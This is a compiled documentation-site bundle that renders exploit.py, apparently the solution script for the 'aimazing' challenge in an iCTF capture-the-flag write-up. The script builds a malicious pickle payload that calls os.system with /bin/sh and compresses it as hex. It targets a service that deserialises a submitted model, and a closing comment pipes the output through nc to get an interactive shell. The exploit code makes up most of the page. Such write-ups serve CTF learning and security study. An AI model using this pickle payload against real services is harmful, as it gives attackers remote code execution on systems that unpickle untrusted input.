"use strict";(self.webpackChunkictf_docs=self.webpackChunkictf_docs||[]).push([[8348],{2319:(e,n,c)=>{c.r(n),c.d(n,{assets:()=>s,contentTitle:()=>i,default:()=>p,frontMatter:()=>r,metadata:()=>d,toc:()=>o});var t=c(4848),a=c(8453);const r={},i=void 0,d={id:"writeups/aimazing/exploit.py",title:"exploit.py",description:"",source:"@site/docs/writeups/aimazing/exploit.py.md",sourceDirName:"writeups/aimazing",slug:"/writeups/aimazing/exploit.py",permalink:"/ictf-docs/writeups/aimazing/exploit.py",draft:!1,unlisted:!1,editUrl:"https://github.com/ucsb-seclab/ictf-docs/tree/main/docs/writeups/aimazing/exploit.py.md",tags:[],version:"current",frontMatter:{},sidebar:"writeups",previous:{title:"aimazing",permalink:"/ictf-docs/writeups/aimazing/"},next:{title:"A(I)PI Escape",permalink:"/ictf-docs/writeups/aipi-escape/"}},s={},o=[];function f(e){const n={code:"code",pre:"pre",...(0,a.R)(),...e.components};return(0,t.jsx)(n.pre,{children:(0,t.jsx)(n.code,{className:"language-python",children:'#!/usr/bin/env python3\r\n\r\nimport pickle\r\nimport zlib\r\n\r\n# see: https://checkoway.net/musings/pickle/\r\nSHELL = f"""cos\r\nsystem\r\n(S\'/bin/sh\'\r\ntR."""\r\n\r\ndef main():\r\n  # embed = lambda c: "wasdx .#F".index(c)\r\n\r\n  # c_actions = "789ced983d72c3201085c3b2e313a451e79934aa7c1e37e9e219fa78262953a5a22437c841239088312c3f5290073bb61a4b9f16bd5d2d3cec0ffcfa7e7c309f67d5f792bd2bc99e94007d48b61bceb6fa0c051c87ef2fea53f5623362c1870335d2506c4204578130865023c95e4dd2ddefe53169034537227b9140580d4d1aad083e2a349975278560a202841e420a2115856503368212799dd5d0eddfa0863791b2d7f56ecac484c018c25814a6a33c24d99b99467b9b8f81e696216e1f22f0919d9b27444c5a7efe9eddccd04718a0e959185738dd1b57e84c5c5a46a0b0b20c17610d043904f101c9579911efd730409043508c308730874a6b98ec8d44f7baab540245ec6db937a74d71818c65036650b06637e56073bd2888e225514585bad7906836aa86ffaa1a7336088da0f21d87bbf6fa364a44d9b5772df34dd8a8fbac84a7cc33fa4bda6855f3f5bd32d21b3cdd1b91b76c5780abd962257ac32dd4bc2df1aa3b87767eba5f6c1fb5cadea655f17ff9d7e18e6e020185808a829a320ebb1f83167820"\r\n  # actions = pickle.loads(zlib.decompress(bytes.fromhex(c_actions)))\r\n  # X, Y = zip(*actions)\r\n  # X = [[embed(c) for c in x] for x in X]\r\n  # Y = [embed(y) for y in Y]\r\n\r\n  # import sklearn.tree\r\n  # clf = sklearn.tree.DecisionTreeClassifier()\r\n  # clf.fit(X, Y)\r\n\r\n  # cmodel = zlib.compress(pickle.dumps(clf)).hex()\r\n\r\n  # print(3)\r\n  # print(cmodel)\r\n\r\n  print(3)\r\n  print(zlib.compress(SHELL.encode()).hex())\r\n\r\nif __name__ == "__main__":\r\n  main()\r\n\r\n# just run as: stty -icanon && (./writeup/exploit.py; cat) | nc localhost 11300\n'})})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(f,{...e})}):f(e)}},8453:(e,n,c)=>{c.d(n,{R:()=>i,x:()=>d});var t=c(6540);const a={},r=t.createContext(a);function i(e){const n=t.useContext(r);return t.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),t.createElement(r.Provider,{value:n},e.children)}}}]);